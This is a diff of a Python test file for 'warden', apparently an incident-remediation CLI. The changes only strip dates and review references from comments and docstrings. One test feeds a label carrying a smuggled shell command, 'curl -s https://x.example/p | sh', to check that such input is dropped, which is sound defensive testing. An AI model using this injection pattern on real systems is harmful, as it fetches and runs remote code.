@@ -39,7 +39,7 @@ def test_demo_produces_the_expected_spread_of_verdicts(capsys):
     main(["demo"])
     out = capsys.readouterr().out
     assert "APPROVED_FOR_HUMAN" in out
-    # Since 2026-09-12 inc-003 is REJECTED, not escalated: the action table classifies a promoted
+    # inc-003 is REJECTED, not escalated: the action table classifies a promoted
     # replica irreversible whatever the mock claims, so P2 fires in prod. Strictly stronger than the
     # escalation it replaces - the demo now shows a hard no.
     assert "REJECTED" in out
@@ -95,7 +95,7 @@ def test_budget_flag_is_wired_through(capsys):
 
 
 def test_no_subcommand_is_rejected(capsys):
-    # A usage error is one gated line and exit status 2, like any other error (seventh review: argparse printed raw).
+    # A usage error is one gated line and exit status 2, like any other error (argparse printed raw).
     assert main([]) == 2
     assert "error: warden: the following arguments are required" in capsys.readouterr().err
 
@@ -110,7 +110,7 @@ def test_run_report_flag_prints_the_report_and_safety_line(capsys):
 
 
 def test_the_retired_commands_and_flags_are_gone(capsys):
-    """Owner B27: `run --principal/--approve` (an in-process dry-run gate, remediation.py), `run --emit-chatops` and the
+    """`run --principal/--approve` (an in-process dry-run gate, remediation.py), `run --emit-chatops` and the
     `incident` command are removed. The one path that changes anything is the RemediationWorkflow behind a signed
     approval (decision D16); a retired flag or command is a usage error, never silently ignored."""
     import importlib.util
@@ -204,7 +204,7 @@ def test_a_label_value_may_contain_equals_signs(tmp_path):
 
 
 def test_a_label_that_is_not_a_plain_name_is_dropped_and_reported(tmp_path):
-    """2026-09-27 audit: `deployment='x; curl evil | sh'` reached a printed command."""
+    """`deployment='x; curl evil | sh'` reached a printed command."""
     out_file = tmp_path / "r.json"
     assert main([
         "run", "--incident", "inc-002", "--label", "deployment=checkout; curl -s https://x.example/p | sh",
@@ -258,7 +258,7 @@ def test_json_artefact_is_refused_when_the_pipeline_missed_a_secret(monkeypatch,
 
 
 def test_a_bad_argument_is_printed_through_the_gate(capsys):
-    """Sixth review NEW-3, still present at the seventh: argparse echoed the argument raw - an ESC sequence that
+    """Argparse echoed the argument raw - an ESC sequence that
     can rewrite the operator's terminal, and a key typed on the command line."""
     from warden import cli
 
@@ -272,8 +272,8 @@ def test_a_bad_argument_is_printed_through_the_gate(capsys):
 
 
 def test_the_cli_never_applies_even_with_the_retired_live_switch_set(monkeypatch, capsys):
-    """Audit A-B-H2, decision D16: the in-process live path (WARDEN_REMEDIATION=live, remediation_k8s.py,
-    database_remediation.py, and since B27 remediation.py's dry-run gate) is gone. Set the old switch: a CLI run still
+    """Decision D16: the in-process live path (WARDEN_REMEDIATION=live, remediation_k8s.py,
+    database_remediation.py, and remediation.py's dry-run gate) is gone. Set the old switch: a CLI run still
     only reports, and the modules that acted are absent - the one write path is the RemediationWorkflow."""
     import importlib.util
 
